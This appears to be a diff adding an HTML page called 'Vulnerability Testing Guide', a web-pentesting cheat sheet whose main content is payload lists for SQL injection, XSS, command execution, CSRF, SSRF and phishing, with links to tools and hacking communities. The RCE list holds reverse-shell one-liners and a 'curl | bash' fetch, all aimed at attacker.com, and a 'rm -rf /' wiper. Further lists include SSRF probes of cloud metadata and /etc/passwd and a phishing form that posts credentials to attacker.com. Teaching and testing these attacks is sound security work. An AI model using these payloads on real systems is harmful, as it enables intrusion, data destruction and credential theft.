@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Vulnerability Testing Guide</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      line-height: 1.6;
+      color: #333;
+      margin: 0;
+      padding: 0;
+      background-color: #f4f4f4;
+    }
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 20px;
+      background-color: #fff;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+    header {
+      background-color: #3498db;
+      color: #fff;
+      padding: 20px 0;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    header h1 {
+      margin: 0;
+      font-size: 2.5em;
+    }
+    nav {
+      background-color: #2980b9;
+      padding: 10px 0;
+      text-align: center;
+      margin-bottom: 20px;
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+    }
+    nav ul {
+      list-style: none;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      flex-wrap: wrap;
+    }
+    nav ul li {
+      margin: 0;
+    }
+    nav ul li a {
+      color: #fff;
+      text-decoration: none;
+      font-weight: bold;
+      padding: 5px 10px;
+      border-radius: 5px;
+      transition: background-color 0.3s ease;
+    }
+    nav ul li a:hover {
+      background-color: #3498db;
+    }
+    section {
+      margin-bottom: 40px;
+      padding-top: 60px;
+    }
+    section h2 {
+      color: #3498db;
+      font-size: 2em;
+      margin-bottom: 15px;
+    }
+    section h3 {
+      color: #2980b9;
+      font-size: 1.5em;
+      margin-bottom: 10px;
+    }
+    section p {
+      font-size: 1.1em;
+      line-height: 1.8;
+      color: #555;
+    }
+    section ul {
+      margin-bottom: 20px;
+      padding-left: 20px;
+    }
+    section ul li {
+      margin-bottom: 10px;
+    }
+    code {
+      background-color: #2d2d2d;
+      color: #f8f8f2;
+      padding: 3px 6px;
+      border-radius: 4px;
+      font-family: "Courier New", Courier, monospace;
+    }
+    pre {
+      background-color: #2d2d2d;
+      color: #f8f8f2;
+      padding: 15px;
+      border-radius: 6px;
+      overflow-x: auto;
+      font-size: 1em;
+      margin-bottom: 20px;
+    }
+    .cta {
+      background-color: #3498db;
+      color: #fff;
+      padding: 20px;
+      text-align: center;
+      border-radius: 6px;
+      margin-top: 40px;
+    }
+    .cta a {
+      color: #fff;
+      font-weight: bold;
+      text-decoration: none;
+    }
+    .cta a:hover {
+      text-decoration: underline;
+    }
+    footer {
+      background-color: #2980b9;
+      color: #fff;
+      text-align: center;
+      padding: 10px 0;
+      margin-top: 40px;
+    }
+    footer p {
+      margin: 0;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Vulnerability Testing Guide</h1>
+  </header>
+  <nav>
+    <ul>
+      <li><a href="#home">Home</a></li>
+      <li><a href="#injection">Injection</a></li>
+      <li><a href="#xss">XSS</a></li>
+      <li><a href="#rce">RCE</a></li>
+      <li><a href="#csrf">CSRF</a></li>
+      <li><a href="#ssrf">SSRF</a></li>
+      <li><a href="#phishing">Phishing</a></li>
+      <li><a href="#other">Other Vulnerabilities</a></li>
+    </ul>
+  </nav>
+  <div class="container">
+    <section id="home">
+      <h2>Welcome to the Vulnerability Testing Guide</h2>
+      <p>This guide provides detailed explanations, tools, and resources for testing various vulnerabilities, including Injection, XSS, RCE, CSRF, SSRF, Phishing, and more.</p>
+    </section>
+    <section id="injection">
+      <h2>Injection Vulnerabilities</h2>
+      <p>Injection vulnerabilities occur when untrusted data is sent to an interpreter as part of a command or query. Common types include SQL Injection, Command Injection, and LDAP Injection.</p>
+      <h3>How to Test</h3>
+      <ul>
+        <li>Inject malicious input into forms or URLs.</li>
+        <li>Use tools like <strong>SQLmap</strong> or <strong>Burp Suite</strong> to automate testing.</li>
+      </ul>
+      <h3>Tools</h3>
+      <ul>
+        <li><a href="https://sqlmap.org/" target="_blank">SQLmap</a></li>
+        <li><a href="https://portswigger.net/burp" target="_blank">Burp Suite</a></li>
+      </ul>
+      <h3>Payloads</h3>
+      <ul>
+        <li><code>' OR '1'='1</code></li>
+        <li><code>admin' --</code></li>
+        <li><code>1; DROP TABLE users;</code></li>
+        <li><code>UNION SELECT null, null, null;</code></li>
+        <li><code>1; EXEC xp_cmdshell('dir');</code></li>
+        <li><code>1 OR 1=1</code></li>
+        <li><code>1' ORDER BY 1--</code></li>
+        <li><code>1' UNION SELECT database(), user(), version()--</code></li>
+        <li><code>1' AND 1=CONVERT(int, (SELECT @@version))--</code></li>
+        <li><code>1'; WAITFOR DELAY '0:0:10'--</code></li>
+      </ul>
+      <h3>Resources</h3>
+      <ul>
+        <li><a href="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/sqli.md" target="_blank">SQL Injection Cheatsheet</a></li>
+        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" target="_blank">SQL Injection Payloads</a></li>
+        <li><a href="https://owasp.org/www-community/attacks/SQL_Injection" target="_blank">OWASP SQL Injection Guide</a></li>
+        <li><a href="https://portswigger.net/web-security/sql-injection" target="_blank">PortSwigger SQL Injection Guide</a></li>
+      </ul>
+    </section>
+    <section id="xss">
+      <h2>Cross-Site Scripting (XSS)</h2>
+      <p>XSS vulnerabilities allow attackers to inject malicious scripts into web pages viewed by other users. Types include Reflected XSS, Stored XSS, and DOM-based XSS.</p>
+      <h3>How to Test</h3>
+      <ul>
+        <li>Inject scripts like <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> into input fields.</li>
+        <li>Use tools like <strong>XSStrike</strong> or <strong>OWASP ZAP</strong> to automate testing.</li>
+      </ul>
+      <h3>Tools</h3>
+      <ul>
+        <li><a href="https://github.com/s0md3v/XSStrike" target="_blank">XSStrike</a></li>
+        <li><a href="https://www.zaproxy.org/" target="_blank">OWASP ZAP</a></li>
+      </ul>
+      <h3>Payloads</h3>
+      <ul>
+        <li><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+        <li><code>&lt;img src=x onerror=alert(1)&gt;</code></li>
+        <li><code>&lt;svg/onload=alert(1)&gt;</code></li>
+        <li><code>&lt;body onload=alert(1)&gt;</code></li>
+        <li><code>&lt;a href="javascript:alert(1)"&gt;Click Me&lt;/a&gt;</code></li>
+        <li><code>&lt;iframe src="javascript:alert(1)"&gt;</code></li>
+        <li><code>&lt;input type="text" value="&lt;script&gt;alert(1)&lt;/script&gt;"&gt;</code></li>
+        <li><code>&lt;textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/textarea&gt;</code></li>
+        <li><code>&lt;div onmouseover=alert(1)&gt;Hover Me&lt;/div&gt;</code></li>
+        <li><code>&lt;script&gt;document.cookie&lt;/script&gt;</code></li>
+      </ul>
+      <h3>Resources</h3>
+      <ul>
+        <li><a href="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md" target="_blank">XSS Cheatsheet</a></li>
+        <li><a href="https://github.com/ismailtasdelen/xss-payload-list" target="_blank">XSS Payload List</a></li>
+        <li><a href="https://owasp.org/www-community/attacks/xss/" target="_blank">OWASP XSS Guide</a></li>
+        <li><a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank">PortSwigger XSS Guide</a></li>
+      </ul>
+    </section>
+    <section id="rce">
+      <h2>Remote Code Execution (RCE)</h2>
+      <p>RCE vulnerabilities allow attackers to execute arbitrary code on a target system. This can lead to full system compromise, data theft, and more.</p>
+      <h3>How to Test</h3>
+      <ul>
+        <li>Inject malicious code into vulnerable input fields or APIs.</li>
+        <li>Use tools like <strong>Metasploit</strong> or <strong>Nmap</strong> to exploit RCE vulnerabilities.</li>
+      </ul>
+      <h3>Tools</h3>
+      <ul>
+        <li><a href="https://www.metasploit.com/" target="_blank">Metasploit</a></li>
+        <li><a href="https://nmap.org/" target="_blank">Nmap</a></li>
+      </ul>
+      <h3>Payloads</h3>
+      <ul>
+        <li><code>; rm -rf /</code></li>
+        <li><code>| ls -la</code></li>
+        <li><code>`id`</code></li>
+        <li><code>$(whoami)</code></li>
+        <li><code>; nc -e /bin/sh attacker.com 4444</code></li>
+        <li><code>; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code></li>
+        <li><code>; echo 'malicious code' > /tmp/exploit.sh</code></li>
+        <li><code>; curl http://attacker.com/exploit.sh | bash</code></li>
+        <li><code>; wget http://attacker.com/exploit.sh -O /tmp/exploit.sh</code></li>
+        <li><code>; php -r '$sock=fsockopen("attacker.com",4444);exec("/bin/sh -i <&3 >&3 2>&3");'</code></li>
+      </ul>
+      <h3>Resources</h3>
+      <ul>
+        <li><a href="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/rce.md" target="_blank">RCE Cheatsheet</a></li>
+        <li><a href="https://owasp.org/www-community/attacks/Code_Injection" target="_blank">OWASP Code Injection Guide</a></li>
+        <li><a href="https://portswigger.net/web-security/rce" target="_blank">PortSwigger RCE Guide</a></li>
+      </ul>
+    </section>
+    <section id="csrf">
+      <h2>Cross-Site Request Forgery (CSRF)</h2>
+      <p>CSRF vulnerabilities allow attackers to trick users into performing actions they did not intend to, such as changing account settings or making unauthorized transactions.</p>
+      <h3>How to Test</h3>
+      <ul>
+        <li>Create malicious forms or URLs that trigger actions on behalf of the user.</li>
+        <li>Use tools like <strong>Burp Suite</strong> or <strong>OWASP ZAP</strong> to automate testing.</li>
+      </ul>
+      <h3>Tools</h3>
+      <ul>
+        <li><a href="https://portswigger.net/burp" target="_blank">Burp Suite</a></li>
+        <li><a href="https://www.zaproxy.org/" target="_blank">OWASP ZAP</a></li>
+      </ul>
+      <h3>Payloads</h3>
+      <ul>
+        <li><code>&lt;img src="http://example.com/change-password?newPassword=attacker"&gt;</code></li>
+        <li><code>&lt;form action="http://example.com/transfer-funds" method="POST"&gt;&lt;input type="hidden" name="amount" value="1000"&gt;&lt;input type="hidden" name="account" value="attacker"&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</code></li>
+        <li><code>&lt;iframe src="http://example.com/delete-account"&gt;&lt;/iframe&gt;</code></li>
+        <li><code>&lt;a href="http://example.com/logout"&gt;Click Me&lt;/a&gt;</code></li>
+        <li><code>&lt;img src="http://example.com/update-email?newEmail=attacker@example.com"&gt;</code></li>
+        <li><code>&lt;form action="http://example.com/update-profile" method="POST"&gt;&lt;input type="hidden" name="name" value="Attacker"&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</code></li>
+        <li><code>&lt;img src="http://example.com/add-admin?username=attacker"&gt;</code></li>
+        <li><code>&lt;form action="http://example.com/delete-user" method="POST"&gt;&lt;input type="hidden" name="userId" value="1"&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</code></li>
+        <li><code>&lt;iframe src="http://example.com/disable-security"&gt;&lt;/iframe&gt;</code></li>
+        <li><code>&lt;a href="http://example.com/reset-password"&gt;Click Me&lt;/a&gt;</code></li>
+      </ul>
+      <h3>Resources</h3>
+      <ul>
+        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSRF%20Injection" target="_blank">CSRF Payloads</a></li>
+        <li><a href="https://owasp.org/www-community/attacks/csrf" target="_blank">OWASP CSRF Guide</a></li>
+        <li><a href="https://portswigger.net/web-security/csrf" target="_blank">PortSwigger CSRF Guide</a></li>
+      </ul>
+    </section>
+    <section id="ssrf">
+      <h2>Server-Side Request Forgery (SSRF)</h2>
+      <p>SSRF vulnerabilities allow attackers to make requests from the server to internal or external resources, leading to data exfiltration or internal network access.</p>
+      <h3>How to Test</h3>
+      <ul>
+        <li>Inject malicious URLs into input fields or APIs.</li>
+        <li>Use tools like <strong>Burp Suite</strong> or <strong>Postman</strong> to test for SSRF.</li>
+      </ul>
+      <h3>Tools</h3>
+      <ul>
+        <li><a href="https://portswigger.net/burp" target="_blank">Burp Suite</a></li>
+        <li><a href="https://www.postman.com/" target="_blank">Postman</a></li>
+      </ul>
+      <h3>Payloads</h3>
+      <ul>
+        <li><code>http://localhost</code></li>
+        <li><code>http://169.254.169.254</code></li>
+        <li><code>http://internal-service</code></li>
+        <li><code>http://attacker.com</code></li>
+        <li><code>file:///etc/passwd</code></li>
+        <li><code>http://127.0.0.1:8080</code></li>
+        <li><code>http://192.168.1.1</code></li>
+        <li><code>http://metadata.google.internal</code></li>
+        <li><code>http://169.254.169.254/latest/meta-data/</code></li>
+        <li><code>http://attacker.com/?url=http://internal-service</code></li>
+      </ul>
+      <h3>Resources</h3>
+      <ul>
+        <li><a href="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/ssrf.md" target="_blank">SSRF Cheatsheet</a></li>
+        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery" target="_blank">SSRF Payloads</a></li>
+        <li><a href="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery" target="_blank">OWASP SSRF Guide</a></li>
+        <li><a href="https://portswigger.net/web-security/ssrf" target="_blank">PortSwigger SSRF Guide</a></li>
+      </ul>
+    </section>
+    <section id="phishing">
+      <h2>Phishing</h2>
+      <p>Phishing is a social engineering attack where attackers trick victims into revealing sensitive information, such as login credentials or financial details, by impersonating a trustworthy entity.</p>
+      <h3>How to Test</h3>
+      <ul>
+        <li>Create fake login pages or emails that mimic legitimate services.</li>
+        <li>Use tools like <strong>GoPhish</strong> or <strong>SocialFish</strong> to automate phishing campaigns.</li>
+      </ul>
+      <h3>Tools</h3>
+      <ul>
+        <li><a href="https://github.com/pentestgeek/phishing-frenzy" target="_blank">Phishing Frenzy</a> 🎉</li>
+        <li><a href="https://github.com/savio-code/ghost-phisher" target="_blank">Ghost Phisher</a> 👻</li>
+        <li><a href="https://github.com/rsmusllp/king-phisher" target="_blank">King Phisher</a> 👑</li>
+        <li><a href="https://github.com/wifiphisher/wifiphisher" target="_blank">WiFiPhisher</a> 📶</li>
+        <li><a href="https://github.com/gophish/gophish" target="_blank">GoPhish</a> 🚀</li>
+        <li><a href="https://github.com/htr-tech/zphisher" target="_blank">Zphisher</a> ⚡</li>
+        <li><a href="https://github.com/iinc0gnit0/BlackPhish" target="_blank">BlackPhish</a> 🖤</li>
+        <li><a href="https://github.com/cryptedwolf/ohmyqr" target="_blank">OhMyQR</a> 🤳</li>
+        <li><a href="https://github.com/hangetzzu/saycheese" target="_blank">SayCheese</a> 📸</li>
+        <li><a href="https://github.com/Viralmaniar/I-See-You" target="_blank">I-See-You</a> 👀</li>
+        <li><a href="https://github.com/trustedsec/social-engineer-toolkit" target="_blank">Social Engineer Toolkit (SET)</a> 🛠</li>
+        <li><a href="https://github.com/kgretzky/evilginx" target="_blank">Evilginx</a> 😈</li>
+        <li><a href="https://github.com/UndeadSec/SocialFish" target="_blank">SocialFish</a> 🐟</li>
+      </ul>
+      <h3>Payloads</h3>
+      <ul>
+        <li><code>Fake Login Page: &lt;form action="http://attacker.com/steal" method="POST"&gt;&lt;input type="text" name="username"&gt;&lt;input type="password" name="password"&gt;&lt;/form&gt;</code></li>
+        <li><code>Phishing Email: "Click here to reset your password: &lt;a href='http://attacker.com/reset'&gt;Reset&lt;/a&gt;"</code></li>
+        <li><code>QR Code Phishing: Generate a QR code linking to a malicious site.</code></li>
+      </ul>
+      <h3>Resources</h3>
+      <ul>
+        <li><a href="https://owasp.org/www-community/attacks/Phishing" target="_blank">OWASP Phishing Guide</a></li>
+        <li><a href="https://en.wikipedia.org/wiki/Phishing" target="_blank">Wikipedia: Phishing</a></li>
+      </ul>
+    </section>
+    <section id="other">
+      <h2>Other Vulnerabilities</h2>
+      <p>This section covers additional vulnerabilities and their testing methodologies.</p>
+      <h3>CRLF Injection</h3>
+      <ul>
+        <li><a href="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md" target="_blank">CRLF Cheatsheet</a></li>
+        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection" target="_blank">CRLF Payloads</a></li>
+      </ul>
+      <h3>CSV Injection</h3>
+      <ul>
+        <li><a href="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/csv-injection.md" target="_blank">CSV Injection Cheatsheet</a></li>
+        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSV%20Injection" target="_blank">CSV Injection Payloads</a></li>
+      </ul>
+      <h3>Command Injection</h3>
+      <ul>
+        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection" target="_blank">Command Injection Payloads</a></li>
+      </ul>
+      <h3>Directory Traversal</h3>
+      <ul>
+        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal" target="_blank">Directory Traversal Payloads</a></li>
+      </ul>
+      <h3>Local File Inclusion (LFI)</h3>
+      <ul>
+        <li><a href="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/lfi.md" target="_blank">LFI Cheatsheet</a></li>
+        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" target="_blank">LFI Payloads</a></li>
+      </ul>
+      <h3>XML External Entity (XXE)</h3>
+      <ul>
+        <li><a href="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xxe.md" target="_blank">XXE Cheatsheet</a></li>
+      </ul>
+      <h3>Open Redirect</h3>
+      <ul>
+        <li><a href="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/open-redirect.md" target="_blank">Open Redirect Cheatsheet</a></li>
+      </ul>
+      <h3>Crypto</h3>
+      <ul>
+        <li><a href="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crypto.md" target="_blank">Crypto Cheatsheet</a></li>
+      </ul>
+      <h3>Template Injection</h3>
+      <ul>
+        <li><a href="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/template-injection.md" target="_blank">Template Injection Cheatsheet</a></li>
+        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" target="_blank">Template Injection Payloads</a></li>
+      </ul>
+      <h3>XSLT Injection</h3>
+      <ul>
+        <li><a href="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xslt.md" target="_blank">XSLT Cheatsheet</a></li>
+      </ul>
+      <h3>Content Injection</h3>
+      <ul>
+        <li><a href="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/content-injection.md" target="_blank">Content Injection Cheatsheet</a></li>
+      </ul>
+      <h3>LDAP Injection</h3>
+      <ul>
+        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection" target="_blank">LDAP Injection Payloads</a></li>
+      </ul>
+      <h3>NoSQL Injection</h3>
+      <ul>
+        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection" target="_blank">NoSQL Injection Payloads</a></li>
+      </ul>
+      <h3>GraphQL Injection</h3>
+      <ul>
+        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection" target="_blank">GraphQL Injection Payloads</a></li>
+      </ul>
+      <h3>Insecure Direct Object References (IDOR)</h3>
+      <ul>
+        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Direct%20Object%20References" target="_blank">IDOR Payloads</a></li>
+      </ul>
+      <h3>Insecure Source Code Management (ISCM)</h3>
+      <ul>
+        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Source%20Code%20Management" target="_blank">ISCM Payloads</a></li>
+      </ul>
+      <h3>LaTeX Injection</h3>
+      <ul>
+        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection" target="_blank">LaTeX Injection Payloads</a></li>
+      </ul>
+      <h3>OAuth</h3>
+      <ul>
+        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/OAuth" target="_blank">OAuth Payloads</a></li>
+      </ul>
+      <h3>XPATH Injection</h3>
+      <ul>
+        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection" target="_blank">XPATH Injection Payloads</a></li>
+      </ul>
+      <h3>Bypass Upload Tricky</h3>
+      <ul>
+        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files" target="_blank">Upload Bypass Payloads</a></li>
+      </ul>
+    </section>
+    <section id="whatsapp">
+      <h2>Join Our WhatsApp Channel</h2>
+      <p>Stay updated with the latest cybersecurity news, tools, and resources by joining our WhatsApp channel:</p>
+      <p><a href="https://whatsapp.com/channel/0029Va7eYYEJZg46Xbulvl1k" target="_blank">Join Now</a></p>
+    </section>
+    <section id="communities">
+      <h2>Popular and Active Communities</h2>
+      <p>Here are some popular and active communities where you can learn, share knowledge, and connect with other hackers and cybersecurity enthusiasts. Make sure to follow the rules and guidelines of each community, and always practice ethical behavior.</p>
+      <h3>1. Reddit Communities</h3>
+      <ul>
+        <li><strong>r/hacking</strong>: General discussions about hacking and cybersecurity. <a href="https://www.reddit.com/r/hacking/" target="_blank">Visit</a></li>
+        <li><strong>r/netsec</strong>: Focused on network security and cybersecurity news. <a href="https://www.reddit.com/r/netsec/" target="_blank">Visit</a></li>
+        <li><strong>r/cybersecurity</strong>: Discussions about cybersecurity careers, tools, and news. <a href="https://www.reddit.com/r/cybersecurity/" target="_blank">Visit</a></li>
+        <li><strong>r/HowToHack</strong>: A community for learning hacking techniques (ethical hacking only). <a href="https://www.reddit.com/r/HowToHack/" target="_blank">Visit</a></li>
+        <li><strong>r/AskNetsec</strong>: A place to ask questions about network security. <a href="https://www.reddit.com/r/AskNetsec/" target="_blank">Visit</a></li>
+      </ul>
+      <h3>2. Discord Communities</h3>
+      <ul>
+        <li><strong>The Cyber Mentor Community</strong>: A Discord server run by Heath Adams (The Cyber Mentor), offering resources and discussions on ethical hacking. <a href="https://discord.gg/thecybermentor" target="_blank">Join</a></li>
+        <li><strong>Hack The Box (HTB)</strong>: Official Discord server for HTB users. <a href="https://discord.gg/hackthebox" target="_blank">Join</a></li>
+        <li><strong>TryHackMe</strong>: Official Discord server for TryHackMe users. <a href="https://discord.gg/tryhackme" target="_blank">Join</a></li>
+        <li><strong>NetSecFocus</strong>: A community focused on penetration testing and cybersecurity. <a href="https://discord.gg/netsecfocus" target="_blank">Join</a></li>
+      </ul>
+      <h3>3. Forums</h3>
+      <ul>
+        <li><strong>Hack Forums</strong>: One of the oldest and most popular hacking forums (be cautious and ethical). <a href="https://hackforums.net/" target="_blank">Visit</a></li>
+        <li><strong>Null Byte</strong>: A community for learning hacking and cybersecurity. <a href="https://null-byte.wonderhowto.com/" target="_blank">Visit</a></li>
+        <li><strong>Exploit Database Forum</strong>: Discussions about exploits and vulnerabilities. <a href="https://forum.exploit-db.com/" target="_blank">Visit</a></li>
+        <li><strong>0x00sec</strong>: A community for reverse engineering, exploit development, and hacking. <a href="https://0x00sec.org/" target="_blank">Visit</a></li>
+      </ul>
+      <h3>4. Online Platforms</h3>
+      <ul>
+        <li><strong>Hack The Box (HTB)</strong>: A platform for practicing penetration testing and hacking. <a href="https://www.hackthebox.com/" target="_blank">Visit</a></li>
+        <li><strong>TryHackMe</strong>: A beginner-friendly platform for learning cybersecurity. <a href="https://tryhackme.com/" target="_blank">Visit</a></li>
+        <li><strong>OverTheWire</strong>: A platform with war games to learn hacking basics. <a href="https://overthewire.org/wargames/" target="_blank">Visit</a></li>
+        <li><strong>CTFtime</strong>: A site to find Capture The Flag (CTF) competitions. <a href="https://ctftime.org/" target="_blank">Visit</a></li>
+      </ul>
+      <h3>5. Social Media Groups</h3>
+      <ul>
+        <li><strong>LinkedIn Groups</strong>:
+          <ul>
+            <li>Cybersecurity Professionals</li>
+            <li>Ethical Hacking and Penetration Testing</li>
+          </ul>
+        </li>
+        <li><strong>Facebook Groups</strong>:
+          <ul>
+            <li>Ethical Hacking & Penetration Testing</li>
+            <li>Cybersecurity Community</li>
+          </ul>
+        </li>
+      </ul>
+      <h3>6. Other Resources</h3>
+      <ul>
+        <li><strong>GitHub</strong>: Explore open-source hacking tools and projects. <a href="https://github.com/" target="_blank">Visit</a></li>
+        <li><strong>YouTube Channels</strong>:
+          <ul>
+            <li>NetworkChuck: <a href="https://www.youtube.com/c/NetworkChuck" target="_blank">Visit</a></li>
+            <li>John Hammond: <a href="https://www.youtube.com/c/JohnHammond010" target="_blank">Visit</a></li>
+            <li>The Cyber Mentor: <a href="https://www.youtube.com/c/TheCyberMentor" target="_blank">Visit</a></li>
+          </ul>
+        </li>
+      </ul>
+      <h3>7. Conferences and Events</h3>
+      <ul>
+        <li><strong>DEF CON</strong>: One of the largest hacking conferences in the world. <a href="https://defcon.org/" target="_blank">Visit</a></li>
+        <li><strong>Black Hat</strong>: A global cybersecurity conference. <a href="https://www.blackhat.com/" target="_blank">Visit</a></li>
+        <li><strong>BSides</strong>: Community-driven cybersecurity events. <a href="https://www.securitybsides.com/" target="_blank">Visit</a></li>
+      </ul>
+    </section>
+    <div class="cta">
+      <p>Found this guide helpful? <a href="#" target="_blank">Share it with your friends</a> and leave a comment below!</p>
+    </div>
+  </div>
+  <footer>
+    <p>&copy; 2023 Vulnerability Testing Guide. All rights reserved.</p>
+  </footer>
+</body>
+</html>
